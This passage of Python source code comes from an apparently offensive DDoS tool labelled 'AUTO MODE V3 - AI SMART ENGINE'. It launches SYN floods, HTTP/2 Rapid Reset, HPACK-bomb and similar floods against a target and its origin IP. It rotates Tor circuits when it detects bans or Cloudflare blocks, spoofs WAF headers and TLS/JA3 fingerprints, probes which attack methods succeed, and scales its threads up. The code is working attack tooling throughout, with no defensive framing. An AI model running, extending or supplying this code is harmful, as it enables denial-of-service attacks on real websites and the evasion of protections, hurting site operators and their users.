                if proc.stdout.at_eof() and proc.stderr.at_eof():
                    break

            try:
                proc.kill()
                await asyncio.wait_for(proc.wait(), timeout=3)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        except Exception as e:
            logger.debug(f"probe {method} error: {e}")
            if proc:
                try:
                    proc.kill()
                except Exception:
                    pass

        result.elapsed = time.time() - start
        if result.ok == 0 and result.fail == 0:
            matches = list(stats_re.finditer(output))
            if matches:
                m = matches[-1]
                result.ok = int(m.group(1))
                result.fail = int(m.group(2))
                result.rps = float(m.group(3))
            else:
                res_m = re.search(r"completed=(\d+)\s+fail=(\d+)", output)
                if res_m:
                    result.ok = int(res_m.group(1))
                    result.fail = int(res_m.group(2))

        if result.ok > 0 or result.fail > 0:
            result.score = _weighted_score(result.ok, result.fail, result.elapsed, prior_alpha, prior_beta)
            result.working = result.ok > 0 and (result.ok / max(result.ok + result.fail, 1)) > 0.05

        tag = "EARLY_KILL" if (early_kill and result.elapsed < duration) else ("OK" if result.working else "FAIL")
        print(f"  [V3] PROBE {method:25s} | ok={result.ok:>6,} fail={result.fail:>6,} rps={result.rps:>8.1f} score={result.score:>8.1f} | {tag}{priors_str}")
        return result

    async def probe_method(self, method: str, duration: int = 12,
                            try_tor_fallback: bool = False) -> MethodProbeResult:
        result = await self._probe_with_early_kill(method, duration)
        if try_tor_fallback and not result.working and self.proxy_chain and method not in ("syn-flood",):
            print(f"  [V3]   -> Direct FAIL, retrying through Tor proxy...")
            result2 = await self._probe_with_early_kill(method, duration, proxy_chain=self.proxy_chain)
            if result2.working or result2.ok > 0:
                result = result2
                result.working = True
                print(f"  [V3]   -> Tor fallback WORKS! ok={result.ok} fail={result.fail}")
        return result

    async def probe_all(self, duration: int = 10) -> List[MethodProbeResult]:
        results = []
        probe_list = METHOD_CANDIDATES.copy()
        probe_list.sort(key=lambda m: _bayesian_score(*self.get_prior(m)), reverse=True)

        smart_list = ["syn-flood"]
        for m in probe_list:
            if m not in smart_list:
                smart_list.append(m)
            if len(smart_list) >= 7:
                break
        if "hpack-bomb" not in smart_list:
            smart_list.append("hpack-bomb")

        print(f"  [V3] Smart-probing {len(smart_list)} methods (top Bayesian priors, {duration}s each)...")
        print(f"  [V3] Candidates: {', '.join(smart_list)}")
        print()

        for i, method in enumerate(smart_list):
            print(f"  [V3] [{i+1}/{len(smart_list)}] Testing {method}...")
            try_tor = self.proxy_chain != "" and method != "syn-flood"
            result = await self.probe_method(method, duration, try_tor_fallback=try_tor)
            results.append(result)

        results.sort(key=lambda r: r.score, reverse=True)

        # V4 vector probing using Python HTTP clients
        try:
            v4_results = await self._probe_v4_vectors(duration)
            results.extend(v4_results)
            results.sort(key=lambda r: r.score, reverse=True)
        except Exception:
            pass

        return results

    async def _probe_v4_vectors(self, duration: int = 10) -> List[MethodProbeResult]:
        v4_results = []
        print(f"  [V3] Probing V4 vectors ({len(V4_VECTOR_CANDIDATES)} methods via Python)...")
        try:
            from curl_cffi.requests import AsyncSession
        except ImportError:
            print(f"  [V3]   curl_cffi not available, skipping V4 vectors")
            return v4_results

        for method in V4_VECTOR_CANDIDATES:
            result = MethodProbeResult(method=method)
            prior_alpha, prior_beta = self.get_prior(method)
            start = time.time()
            try:
                async with AsyncSession(impersonate="chrome136", timeout=8) as sess:
                    ok = 0; fail = 0
                    for _ in range(5):
                        try:
                            pool = WafHeaderSpoofingPool()
                            headers = pool.generate_headers(10)
                            resp = await sess.get(self.target, headers=headers)
                            if resp.status_code in (200, 301, 302, 403):
                                ok += 1
                            else:
                                fail += 1
                        except Exception:
                            fail += 1
                    result.ok = ok
                    result.fail = fail
            except Exception:
                result.fail = 5
            result.elapsed = time.time() - start
            if result.ok > 0:
                result.score = _weighted_score(result.ok, result.fail, result.elapsed, prior_alpha, prior_beta)
                result.working = True
            tag = "OK" if result.working else "FAIL"
            print(f"  [V3] V4 {method:25s} | ok={result.ok:>6,} fail={result.fail:>6,} | {tag}")
            v4_results.append(result)
        return v4_results

# ======================================================================
# V3 Baseline: CombinedEngine (SYN flood + Rapid Reset with Tor rotation)
# ======================================================================

class CombinedEngine:
    def __init__(self, target: str, origin_ip: str, duration: int,
                 syn_threads: int = 500, rr_threads: int = 100,
                 tor_instances: int = 15, rotation_interval: int = 45):
        self.target = target
        self.origin_ip = origin_ip
        self.duration = duration
        self.syn_threads = syn_threads
        self.rr_threads = rr_threads
        self.tor_instances = tor_instances
        self.rotation_interval = rotation_interval
        self._tor_manager = None
        self._proxy_chain = ""
        self._proxy_file = ""
        self._syn_proc = None
        self._rr_proc = None
        self.syn_stats = {"status": "idle", "stats": {}}
        self.rr_stats = {"status": "idle", "stats": {}}
        self._syn_consecutive_fail = 0
        self._rr_consecutive_fail = 0
        self._last_ban_detected = 0.0
        self._total_tor_rotations = 0
        self._last_rotate_ts = 0.0
        self._start_ts = 0.0
        self._rr_direct_proc = None
        self._rr_fallback_launched = False
        self._rr_direct_stats = {"status": "idle", "stats": {}}
        self._ban_log_count = 0
        self._ban_log_throttled = False
        self.logger = StatusLogger(target, origin_ip, duration)
        self._stats_re = re.compile(r"\[STATS\].*?ok=(\d+).*?fail=(\d+).*?in_flight=(\d+).*?rps=([\d.]+)")

    async def _start_tor(self) -> bool:
        if self.tor_instances <= 0:
            self.logger.log("TOR_SKIP", {"reason": "tor_instances=0"})
            return False
        try:
            from core.network.tor.manager import TorManager
        except ImportError:
            self.logger.log("TOR_ERROR", {"error": "TorManager import failed"})
            return False
        self.logger.log("TOR_START", {"instances": self.tor_instances})
        tor = TorManager(instances=self.tor_instances)
        tor.setup_instances()
        started = tor.start_all(wait_bootstrap=False)
        self._tor_manager = tor
        if started == 0:
            self.logger.log("TOR_ERROR", {"error": "No Tor instances started"})
            return False
        self.logger.log("TOR_BOOTSTRAP", {"started": started})
        bootstrap_start = time.time()
        bootstrap_timeout = 90
        while time.time() - bootstrap_start < bootstrap_timeout:
            bootstrapped = sum(
                1 for inst in tor.instances
                if inst.pid and self._check_tor_bootstrap(inst)
            )
            if bootstrapped >= started:
                break
            await asyncio.sleep(3)
        self.logger.log("TOR_BOOTSTRAP_DONE", {"bootstrapped": bootstrapped})
        socks_addrs = []
        for inst in tor.instances:
            if inst.pid:
                socks_addrs.append(f"socks5://127.0.0.1:{inst.socks_port}")
        if not socks_addrs:
            self.logger.log("TOR_ERROR", {"error": "No SOCKS proxies available"})
            return False
        self._proxy_chain = socks_addrs[0]
        proxy_file_path = "proxies/_tor_pool_v3.txt"
        os.makedirs("proxies", exist_ok=True)
        with open(proxy_file_path, "w") as f:
            f.write("\n".join(socks_addrs))
        self._proxy_file = proxy_file_path
        self.logger.log("TOR_PROXY", {"chain": self._proxy_chain[:40] + "..."})
        return True

    @staticmethod
    def _check_tor_bootstrap(instance) -> bool:
        from pathlib import Path
        log_path = Path("logs/tor") / f"tor{instance.instance_id}.log"
        if log_path.exists():
            try:
                content = log_path.read_text(encoding="utf-8", errors="replace")
                return "Bootstrapped 100%" in content
            except Exception:
                pass
        return False

    async def _rotate_tor(self):
        if not self._tor_manager:
            return
        try:
            for inst in self._tor_manager.instances:
                if inst.pid:
                    try:
                        self._tor_manager.rotate_circuit(inst.instance_id)
                    except Exception:
                        pass
            self._total_tor_rotations += 1
            self._last_rotate_ts = time.time()
            if self._total_tor_rotations <= 10 or self._total_tor_rotations % 5 == 0:
                self.logger.log("TOR_ROTATE", {
                    "rotation": self._total_tor_rotations,
                    "instances": len(self._tor_manager.instances),
                })
        except Exception as e:
            self.logger.log("TOR_ROTATE_ERROR", {"error": str(e)})

    async def _launch_syn_flood(self):
        args = [GO_ENGINE, "-target", self.target, "-duration", str(self.duration),
                "-method", "syn-flood", "-threads", str(self.syn_threads), "-rps", "100000"]
        if self.origin_ip:
            args.extend(["-origin", self.origin_ip])
        self.logger.log("SYN_LAUNCH", {"args": " ".join(args)})
        proc = await asyncio.create_subprocess_exec(
            *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
        )
        self._syn_proc = proc
        return proc

    async def _launch_rapid_reset(self):
        args = [GO_ENGINE, "-target", self.target, "-duration", str(self.duration),
                "-method", "rapid-reset", "-threads", str(self.rr_threads),
                "-rps", "100000", "-http2"]
        if self._proxy_chain:
            args.extend(["-proxy-chain", self._proxy_chain])
        elif self._proxy_file:
            args.extend(["-proxy-file", self._proxy_file])
        self.logger.log("RR_LAUNCH", {"args": " ".join(args)})
        proc = await asyncio.create_subprocess_exec(
            *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
        )
        self._rr_proc = proc
        return proc

    async def _launch_rr_direct(self):
        if self._rr_fallback_launched:
            return None
        self._rr_fallback_launched = True
        print(f"  [V3] RR fallback: launching direct (no proxy chain)")
        args = [GO_ENGINE, "-target", self.target, "-duration", str(self.duration),
                "-method", "rapid-reset", "-threads", str(self.rr_threads),
                "-rps", "100000", "-http2"]
        self.logger.log("RR_FALLBACK_DIRECT", {"args": " ".join(args)})
        proc = await asyncio.create_subprocess_exec(
            *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
        )
        self._rr_direct_proc = proc
        return proc

    async def _monitor_stream(self, stream, engine_name: str, stats_dict: dict):
        try:
            while True:
                line = await stream.readline()
                if not line:
                    break
                text = line.decode(errors="replace").strip()
                if not text:
                    continue
                m = self._stats_re.search(text)
                if m:
                    ok = int(m.group(1)); fail = int(m.group(2))
                    in_flight = int(m.group(3)); rps_val = float(m.group(4))
                    stats_dict["stats"] = {"completed": ok, "failed": fail, "in_flight": in_flight, "current_rps": rps_val}
                    continue
                if engine_name == "rr":
                    self._detect_rr_error(text)
        except (asyncio.CancelledError, Exception):
            pass

    def _detect_rr_error(self, text: str):
        now = time.time()
        lower = text.lower()
        is_ban = any(kw in lower for kw in [
            "403", "forbidden", "access denied", "cloudflare",
            "connection reset", "connection refused",
            "502", "503", "520", "bad gateway", "origin error",
            "timeout", "deadline exceeded", "wsarecv", "writesock",
        ])
        if is_ban:
            self._rr_consecutive_fail += 1
            if self._rr_consecutive_fail >= 3:
                elapsed_since_last = now - self._last_ban_detected
                if elapsed_since_last > 20 and not self._rr_fallback_launched:
                    if self._ban_log_count <= 3 or self._ban_log_count % 10 == 0:
                        self.logger.log("BAN_DETECTED", {"consecutive_fails": self._rr_consecutive_fail, "text": text[:120]})
                    self._ban_log_count += 1
                    self._last_ban_detected = now
                    asyncio.create_task(self._rotate_tor())
                    self._rr_consecutive_fail = 0
        else:
            self._rr_consecutive_fail = 0

    def _check_rr_stats_for_ban(self):
        stats = self.rr_stats.get("stats", {})
        completed = stats.get("completed", 0)
        failed = stats.get("failed", 0)
        total = completed + failed
        if total > 100 and failed > 0:
            fail_rate = failed / total
            if fail_rate > 0.8:
                now = time.time()
                if now - self._last_ban_detected > 20:
                    self._ban_log_count += 1
                    if self._ban_log_count <= 3:
                        self.logger.log("BAN_STATS", {"fail_rate": f"{fail_rate:.0%}", "completed": completed, "failed": failed})
                    elif not self._ban_log_throttled:
                        self._ban_log_throttled = True
                        self.logger.log("BAN_STATS_THROTTLED", {"fail_rate": f"{fail_rate:.0%}", "completed": completed, "failed": failed})
                    if not self._rr_fallback_launched:
                        self._last_ban_detected = now
                        asyncio.create_task(self._rotate_tor())

    async def _monitor_loop(self):
        syn_warned = False
        while True:
            await asyncio.sleep(5)
            now = time.time()
            elapsed = now - self._start_ts
            time_since_last_rotate = now - self._last_rotate_ts
            if time_since_last_rotate >= self.rotation_interval and elapsed > 30:
                await self._rotate_tor()
            self._check_rr_stats_for_ban()
            rr_s = self.rr_stats.get("stats", {})
            rr_ok = rr_s.get("completed", 0)
            rr_fail = rr_s.get("failed", 0)
            if not self._rr_fallback_launched and elapsed > 60 and rr_ok == 0 and rr_fail > 0:
                await self._launch_rr_direct()
            syn_s = self.syn_stats.get("stats", {})
            syn_ok = syn_s.get("completed", 0)
            syn_fail = syn_s.get("failed", 0)
            if not syn_warned and elapsed > 60 and syn_ok == 0 and syn_fail > 0:
                syn_warned = True
                print(f"  [V3] SYN flood: 0 completed ({syn_fail:,} fails) - need admin rights on Windows for raw sockets")
            if int(elapsed) % 30 < 5:
                rr_direct_s = self._rr_direct_stats.get("stats", {})
                rr_direct_ok = rr_direct_s.get("completed", 0)
                rr_direct_fail = rr_direct_s.get("failed", 0)
                if self._rr_fallback_launched and rr_direct_ok > 0:
                    rr_ok = rr_direct_ok
                    rr_fail = rr_direct_fail
                total_ok = syn_ok + rr_ok
                total_fail = syn_fail + rr_fail
                pct = f"{total_ok/max(total_ok+total_fail,1)*100:.0f}%" if total_ok+total_fail > 0 else "0%"
                print(f"  [V3] {elapsed:.0f}s | SYN:{syn_ok:,}ok/{syn_fail:,}fail | RR:{rr_ok:,}ok/{rr_fail:,}fail | Total:{total_ok:,}ok/{total_fail:,}fail ({pct}) | Tor:{self._total_tor_rotations}rot")

    async def run(self) -> Dict[str, Any]:
        self._start_ts = time.time()
        self.logger.set_start()
        print(f"\n  [V3] Combined Attack: {self.target}")
        print(f"  [V3] Origin IP: {self.origin_ip} | Duration: {self.duration}s | Tor rotate: {self.rotation_interval}s\n")
        tor_ok = await self._start_tor()
        syn_proc = await self._launch_syn_flood()
        rr_proc = await self._launch_rapid_reset()
        self.logger.log("ATTACK_START", {"target": self.target, "origin_ip": self.origin_ip, "duration": self.duration, "tor_ok": tor_ok})
        syn_reader = asyncio.create_task(self._monitor_stream(syn_proc.stdout, "syn", self.syn_stats))
        syn_err_reader = asyncio.create_task(self._monitor_stream(syn_proc.stderr, "syn", self.syn_stats))
        rr_reader = asyncio.create_task(self._monitor_stream(rr_proc.stdout, "rr", self.rr_stats))
        rr_err_reader = asyncio.create_task(self._monitor_stream(rr_proc.stderr, "rr", self.rr_stats))
        monitor_task = asyncio.create_task(self._monitor_loop())
        rr_direct_reader = None
        rr_direct_err_reader = None
        try:
            wait_time = self.duration + 30
            while wait_time > 0:
                await asyncio.sleep(5)
                wait_time -= 5
                if self._rr_fallback_launched and rr_direct_reader is None and self._rr_direct_proc:
                    rr_direct_reader = asyncio.create_task(self._monitor_stream(self._rr_direct_proc.stdout, "rr_direct", self._rr_direct_stats))
                    rr_direct_err_reader = asyncio.create_task(self._monitor_stream(self._rr_direct_proc.stderr, "rr_direct", self._rr_direct_stats))
        except asyncio.CancelledError:
            print(f"\n  [!] Attack cancelled by user")
            self.logger.log("CANCELLED", {})
        print(f"\n  [V3] Shutting down...")
        self.logger.log("SHUTDOWN", {})
        procs = [(self._syn_proc, "SYN"), (self._rr_proc, "RR")]
        if self._rr_direct_proc:
            procs.append((self._rr_direct_proc, "RR-DIRECT"))
        for proc, name in procs:
            if proc and proc.returncode is None:
                try:
                    proc.kill(); await proc.wait()
                    print(f"  [+] {name} stopped")
                except Exception as e:
                    print(f"  [!] {name} kill error: {e}")
        tasks = [syn_reader, syn_err_reader, rr_reader, rr_err_reader, monitor_task]
        if rr_direct_reader: tasks.append(rr_direct_reader)
        if rr_direct_err_reader: tasks.append(rr_direct_err_reader)
        for task in tasks: task.cancel()
        if self._tor_manager:
            try:
                self._tor_manager.stop_all()
                print(f"  [+] Tor instances stopped")
                self.logger.log("TOR_STOP", {"instances": len(self._tor_manager.instances)})
            except Exception as e:
                print(f"  [!] Tor stop error: {e}")
        syn_s = self.syn_stats.get("stats", {})
        rr_s = self.rr_stats.get("stats", {})
        rr_direct_s = self._rr_direct_stats.get("stats", {})
        rr_ok = rr_direct_s.get("completed", 0) if rr_direct_s.get("completed", 0) > rr_s.get("completed", 0) else rr_s.get("completed", 0)
        rr_fail = rr_direct_s.get("failed", 0) if rr_direct_s.get("completed", 0) > rr_s.get("completed", 0) else rr_s.get("failed", 0)
        result = {
            "engine": "auto_mode_v3_combined",
            "target": self.target, "origin_ip": self.origin_ip,
            "duration_real": time.time() - self._start_ts,
            "syn_total": syn_s.get("completed", 0) + syn_s.get("failed", 0),
            "syn_completed": syn_s.get("completed", 0), "syn_failed": syn_s.get("failed", 0),
            "rr_total": rr_ok + rr_fail, "rr_completed": rr_ok, "rr_failed": rr_fail,
            "rr_through_tor": rr_s.get("completed", 0) > 0,
            "rr_direct_fallback": self._rr_fallback_launched,
            "tor_rotations": self._total_tor_rotations,
            "combined_total": syn_s.get("completed", 0) + syn_s.get("failed", 0) + rr_ok + rr_fail,
        }
        self.logger.log("RESULT", result)
        self.logger.finalize()
        fallback_note = " (direct fallback)" if result["rr_direct_fallback"] else ""
        if result.get("rr_through_tor"): fallback_note += " [Tor]"
        print(f"\n  [V3] RESULTS")
        print(f"  [V3] SYN Flood:    {result['syn_completed']:>10,} ok / {result['syn_failed']:>10,} fail")
        print(f"  [V3] Rapid Reset:  {result['rr_completed']:>10,} ok / {result['rr_failed']:>10,} fail{fallback_note}")
        print(f"  [V3] COMBINED:     {result['combined_total']:>10,} total | {result['tor_rotations']} Tor rotations")
        return result

# ======================================================================
# Phase 2: Adaptive Engine (V4 smart method management)
# ======================================================================

@dataclass
class RunningMethod:
    method: str
    threads: int
    proc: Optional[asyncio.subprocess.Process] = None
    stats: Dict[str, Any] = field(default_factory=lambda: {"ok": 0, "fail": 0, "rps": 0.0})
    score: float = 0.0
    ok_history: List[int] = field(default_factory=list)
    fail_history: List[int] = field(default_factory=list)
    consecutive_zero: int = 0
    reader_task: Optional[asyncio.Task] = None

class AdaptiveEngine:
    def __init__(self, target: str, origin_ip: str, duration: int,
                 ranked_methods: List[MethodProbeResult], proxy_chain: str = "",
                 tor_available: bool = False, max_methods: int = 3):
        self.target = target
        self.origin_ip = origin_ip
        self.duration = duration
        self.ranked = ranked_methods
        self.proxy_chain = proxy_chain
        self.tor_available = tor_available
        self.max_methods = max_methods
        self.running: Dict[str, RunningMethod] = {}
        self.waitlist: List[MethodProbeResult] = list(ranked_methods)
        self.start_ts: float = 0.0
        self.total_ok: int = 0
        self.total_fail: int = 0
        self.total_tor_rotations: int = 0
        self._last_rotate_ts: float = 0.0
        self._stats_re = re.compile(r"\[STATS\].*?ok=(\d+).*?fail=(\d+).*?rps=([\d.]+)")

    JA3_PROFILES = ["chrome136", "chrome120", "firefox140", "safari18", "edge136"]

    def _get_method_args(self, method: str, threads: int = 50) -> List[str]:
        args = [GO_ENGINE, "-target", self.target, "-duration", str(self.duration),
                "-method", method, "-threads", str(threads), "-rps", "100000"]
        h2_methods = {"hpack-bomb", "rapid-reset", "settings-flood", "continuation"}
        if method in h2_methods:
            args.append("-http2")
        if method in ("syn-flood",) and self.origin_ip:
            args.extend(["-origin", self.origin_ip])
        if self.proxy_chain and method not in ("syn-flood",):
            args.extend(["-proxy-chain", self.proxy_chain])
        if method not in ("syn-flood", "udp-flood"):
            ja3 = random.choice(self.JA3_PROFILES)
            args.extend(["-ja3", ja3])
        return args

    async def _reader(self, stream, method_name: str):
        rm = self.running.get(method_name)
        if not rm: return
        try:
            while True:
                line = await stream.readline()
                if not line: break
                text = line.decode(errors="replace").strip()
                if not text: continue
                m = self._stats_re.search(text)
                if m:
                    ok = int(m.group(1)); fail = int(m.group(2)); rps = float(m.group(3))
                    rm.stats = {"ok": ok, "fail": fail, "rps": rps}
                    rm.ok_history.append(ok); rm.fail_history.append(fail)
                    if len(rm.ok_history) > 10:
                        rm.ok_history.pop(0); rm.fail_history.pop(0)
        except (asyncio.CancelledError, Exception):
            pass

    async def launch_method(self, method_result: MethodProbeResult, threads: int = 50) -> bool:
        method = method_result.method
        if method in self.running: return False
        args = self._get_method_args(method, threads)
        try:
            proc = await asyncio.create_subprocess_exec(
                *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
            )
        except Exception as e:
            print(f"  [V3] Launch error {method}: {e}")
            return False
        rm = RunningMethod(method=method, threads=threads, proc=proc, score=method_result.score)
        rm.reader_task = asyncio.create_task(self._reader(proc.stdout, method))
        asyncio.create_task(self._reader(proc.stderr, method))
        self.running[method] = rm
        print(f"  [V3] LAUNCH {method} (threads={threads}, prior_score={method_result.score:.1f})")
        return True

    async def stop_method(self, method: str):
        rm = self.running.get(method)
        if not rm: return
        if rm.proc and rm.proc.returncode is None:
            try: rm.proc.kill(); await rm.proc.wait()
            except: pass
        if rm.reader_task: rm.reader_task.cancel()
        del self.running[method]

    async def monitor_loop(self):
        await asyncio.sleep(15)
        adaptation_round = 0
        while True:
            await asyncio.sleep(10)
            adaptation_round += 1
            elapsed = time.time() - self.start_ts
            if elapsed > self.duration: break
            print(f"\n  [V3] ADAPT round {adaptation_round} | elapsed={elapsed:.0f}s")
            method_stats = {}
            total_ok_round = 0; total_fail_round = 0
            dead_methods = []
            for mname, rm in list(self.running.items()):
                ok = rm.stats.get("ok", 0); fail = rm.stats.get("fail", 0); rps = rm.stats.get("rps", 0)
                total_ok_round += ok; total_fail_round += fail
                recent_ok = rm.ok_history[-1] if rm.ok_history else 0
                recent_ok_prev = rm.ok_history[-3] if len(rm.ok_history) >= 3 else 0
                if ok == 0 and fail > 100: rm.consecutive_zero += 1
                else: rm.consecutive_zero = 0
                if ok >= 100 and (ok / max(ok + fail, 1)) > 0.1: status = "OK"
                elif ok > 0: status = "LOW"
                else: status = "DEAD" if rm.consecutive_zero >= 3 else "STALL"
                if status == "DEAD": dead_methods.append(mname)
                rate = ok / max(ok + fail, 1) * 100
                method_stats[mname] = {"ok": ok, "fail": fail, "rps": rps, "rate": rate, "status": status}
                print(f"  [V3]   {mname:25s} | ok={ok:>8,} fail={fail:>8,} rps={rps:>8.1f} rate={rate:>5.1f}% | {status}")
            self.total_ok = total_ok_round; self.total_fail = total_fail_round
            if dead_methods:
                for dead in dead_methods:
                    print(f"  [V3] SWAP {dead} is DEAD, replacing...")
                    await self.stop_method(dead)
                    next_method = None
                    for wl in self.waitlist:
                        if wl.method not in self.running and wl.method not in dead_methods:
                            next_method = wl; break
                    if next_method:
                        await self.launch_method(next_method, threads=100)
                    elif self.ranked:
                        m = self.ranked[0]
                        if m.method not in self.running:
                            await self.launch_method(m, threads=30)
            for mname, rm in list(self.running.items()):
                ok = rm.stats.get("ok", 0); fail = rm.stats.get("fail", 0)
                rate = ok / max(ok + fail, 1); rps_val = rm.stats.get("rps", 0)
                if rate > 0.5 and rps_val > 500 and rm.threads < 500:
                    new_threads = min(rm.threads * 2, 500)
                    if new_threads != rm.threads:
                        print(f"  [V3] SCALE {mname}: threads {rm.threads} -> {new_threads} (rate={rate:.0%} rps={rps_val:.0f})")
                        rm.threads = new_threads
                        await self.stop_method(mname)
                        for mr in self.ranked:
                            if mr.method == mname:
                                await self.launch_method(mr, threads=new_threads)
                                break
            if self.tor_available and total_ok_round + total_fail_round > 1000:
                fail_rate = total_fail_round / max(total_ok_round + total_fail_round, 1)
                if fail_rate > 0.9:
                    now = time.time()
                    if now - self._last_rotate_ts > 30:
                        print(f"  [V3] TOR_ROTATE fail_rate={fail_rate:.0%}")
                        self._last_rotate_ts = now
                        self.total_tor_rotations += 1
            if len(self.running) == 0 and self.ranked:
                print(f"  [V3] All methods dead, restarting top candidate...")
                await self.launch_method(self.ranked[0], threads=50)

    async def run(self) -> Dict[str, Any]:
        self.start_ts = time.time()
        print(f"\n  [V3] === ADAPTIVE ATTACK ===")
        print(f"  [V3] Top methods: {[m.method for m in self.ranked[:self.max_methods]]}")
        print()
        launched = 0
        for mr in self.ranked:
            if launched >= self.max_methods: break
            if mr.working or mr.ok > 0:
                await self.launch_method(mr, threads=80)
                launched += 1
                await asyncio.sleep(2)
        if launched == 0 and self.ranked:
            print(f"  [V3] No working methods found, force-launching top scorer...")
            await self.launch_method(self.ranked[0], threads=80)
            launched += 1
        monitor_task = asyncio.create_task(self.monitor_loop())
        remaining = self.duration
        while remaining > 0:
            await asyncio.sleep(5)
            remaining -= 5
        monitor_task.cancel()
        self._final_stats = {}
        for mname, rm in dict(self.running).items():
            self._final_stats[mname] = dict(rm.stats)
        for mname in list(self.running.keys()):
            await self.stop_method(mname)
        print(f"\n  [V3] === ADAPTIVE FINISHED ===")
        return self.get_results()

    def get_results(self) -> Dict[str, Any]:
        methods_detail = {}
        total_ok = 0; total_fail = 0
        final_stats = getattr(self, '_final_stats', {})
        for mname, stats in final_stats.items():
            ok = stats.get("ok", 0); fail = stats.get("fail", 0)
            total_ok += ok; total_fail += fail
            methods_detail[mname] = {**stats, "probe_only": False}
        for mr in self.ranked:
            if mr.method not in methods_detail and (mr.ok > 0 or mr.fail > 0):
                methods_detail[mr.method] = {"ok": mr.ok, "fail": mr.fail, "rps": mr.rps, "probe_only": True}
        return {
            "engine": "auto_mode_v3_adaptive",
            "target": self.target, "origin_ip": self.origin_ip,
            "duration": self.duration,
            "total_ok": total_ok, "total_fail": total_fail,
            "combined_total": total_ok + total_fail,
            "methods": methods_detail,
            "top_methods": [m.method for m in self.ranked[:self.max_methods]],
            "tor_rotations": self.total_tor_rotations,
        }

# ======================================================================
# Smart Orchestrator: CombinedEngine + AdaptiveEngine
# ======================================================================

class SmartAutoModeV3:
    def __init__(self, target: str, origin_ip: str = "", duration: int = 600,
                 syn_threads: int = 500, rr_threads: int = 100,
                 tor_instances: int = 15, rotation_interval: int = 45):
        self.target = target
        self.origin_ip = origin_ip
        self.duration = duration
        self.syn_threads = syn_threads
        self.rr_threads = rr_threads
        self.tor_instances = tor_instances
        self.rotation_interval = rotation_interval
        self.proxy_chain = ""
        self.tor_available = tor_instances > 0
        self._tor_manager = None
        self.bypass_info = {"waf": {}, "cookies": False, "header_pool": 0, "orchestrator": {}}

    async def start_tor(self) -> bool:
        if self.tor_instances <= 0:
            return False
        subprocess.run(["taskkill", "/F", "/IM", "tor.exe"], capture_output=True)
        for d in ["data/tor", "logs/tor"]:
            import shutil
            shutil.rmtree(d, ignore_errors=True)
        await asyncio.sleep(2)
        try:
            from core.network.tor.manager import TorManager
        except ImportError:
            return False
        tor = TorManager(instances=self.tor_instances)
        tor.setup_instances()
        started = tor.start_all(wait_bootstrap=False)
        if started == 0:
            return False

        # Bootstrap polling with live progress animation
        from pathlib import Path
        import sys
        bootstrap_start = time.time()
        bootstrap_timeout = 90
        spinner = ['|', '/', '-', '\\']
        spin_idx = 0
        last_print = 0.0

        while time.time() - bootstrap_start < bootstrap_timeout:
            # Read progress per instance
            progress_lines = []
            bootstrapped = 0
            for inst in tor.instances:
                if not inst.pid:
                    continue
                log_path = Path("logs/tor") / f"tor{inst.instance_id}.log"
                pct = 0
                phase = "starting"
                if log_path.exists():
                    try:
                        content = log_path.read_text(encoding="utf-8", errors="replace")
                        if "Bootstrapped 100%" in content:
                            pct = 100
                            phase = "DONE"
                            bootstrapped += 1
                        else:
                            for line in reversed(content.split("\n")):
                                if "Bootstrapped" in line and "%" in line:
                                    try:
                                        pct_str = line.split("Bootstrapped")[1].split("%")[0].strip()
                                        pct = int(pct_str)
                                        if "(" in line and ")" in line:
                                            phase = line.split("(")[1].split(")")[0].strip()
                                        break
                                    except Exception:
                                        continue
                    except Exception:
                        pass

                bar_w = 20
                filled = int((pct / 100.0) * bar_w)
                bar = "#" * filled + "." * (bar_w - filled)
                progress_lines.append(f"tor{inst.instance_id}:[{bar}]{pct:>3}%")

            # Render single line summary (only every 2s to reduce spam)
            now = time.time()
            if now - last_print >= 2.0 or bootstrapped >= started:
                last_print = now
                spin = spinner[spin_idx % len(spinner)]
                elapsed = int(time.time() - bootstrap_start)
                color = "g" if bootstrapped == started else "y"
                line = f"\r  {_c(color,spin)} {_c('c','Tor')} {_c('w',str(bootstrapped)+'/'+str(started))} ({_c('d',str(elapsed)+'s')}) | {' '.join(progress_lines[:4])}"
                try:
                    sys.stdout.write(line[:120].ljust(120))
                    sys.stdout.flush()
                except Exception:
                    pass

            if bootstrapped >= started:
                print()
                break

            spin_idx += 1
            await asyncio.sleep(0.4)
        else:
            print()  # newline after timeout

        socks_addrs = []
        for inst in tor.instances:
            if inst.pid:
                socks_addrs.append(f"socks5://127.0.0.1:{inst.socks_port}")
        if socks_addrs:
            self.proxy_chain = socks_addrs[0]
            self._tor_manager = tor
            return True
        return False
        if socks_addrs:
            self.proxy_chain = socks_addrs[0]
            self._tor_manager = tor
            return True
        return False

    @staticmethod
    def _check_tor_bootstrap(instance) -> bool:
        from pathlib import Path
        log_path = Path("logs/tor") / f"tor{instance.instance_id}.log"
        if log_path.exists():
            try:
                content = log_path.read_text(encoding="utf-8", errors="replace")
                return "Bootstrapped 100%" in content
            except Exception:
                pass
        return False

    async def stop_tor(self):
        if self._tor_manager:
            try: self._tor_manager.stop_all()
            except: pass

    def _get_phase_concurrency(self, phase: str) -> int:
        config = {
            "profiling": (50, 100),
            "probing": (500, 2000),
            "attack": (5000, 10000),
            "report": (10, 10),
        }
        low, high = config.get(phase, (100, 500))
        return random.randint(low, high)

    async def _behavioral_warmup(self):
        """Pre-attack behavioral warming: visit legitimate pages first."""
        warmup = SessionWarmingEngine(self.target)
        await warmup.warmup(duration=20)
        return warmup

    async def run(self) -> Dict[str, Any]:
        print(f"\n  {'='*50}")
        print(f"  [V3] AUTO MODE V3 - AI SMART ENGINE 2026")
        print(f"  {'='*50}")
        print(f"  [V3] Target: {self.target}")
        print(f"  [V3] Origin: {self.origin_ip or 'auto-detect'}")
        print(f"  [V3] Duration: {self.duration}s")
        print(f"  [V3] Tor: {self.tor_instances} instances")
        print()

        # Phase 0: Server Profiling
        print(f"  [V3] Phase 0: Server Profiling...")
        profiler = ServerProfiler(self.target, self.origin_ip)
        profile = profiler.run()
        print(f"  [V3]   Server: {profile.server_type}")
        print(f"  [V3]   Header: {profile.server_header or '(none)'}")
        print(f"  [V3]   HTTP/2: {'YES' if profile.has_http2 else 'NO'}")
        print(f"  [V3]   HTTP/3: {'YES' if profile.has_http3 else 'NO'}")
        print(f"  [V3]   Cloudflare: {'YES' if profile.has_cf else 'NO'}")
